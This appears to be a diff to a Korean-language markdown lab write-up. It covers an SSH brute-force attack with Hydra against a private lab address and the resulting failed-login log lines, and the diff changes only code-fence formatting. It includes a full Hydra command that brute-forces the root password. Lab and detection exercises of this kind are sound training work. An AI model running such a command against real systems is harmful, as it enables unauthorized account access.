@@ -16,16 +16,14 @@
 Hydra를 사용하여 SSH brute force 공격 수행
 
 '''bash
-hydra -l root -P pass.txt ssh://192.168.85.130 -t 4	
-'''
+hydra -l root -P pass.txt ssh://192.168.85.130 -t 4'''
 ---
 
 ## 📜 로그 분석
 다음과 같은 로그인 실패 로그가 확인되었다.
 
 '''bash
-Failed password for root from 192.168.85.134
-'''
+Failed password for root from 192.168.85.134'''
 ---
 
 ### 🔎 분석 결과
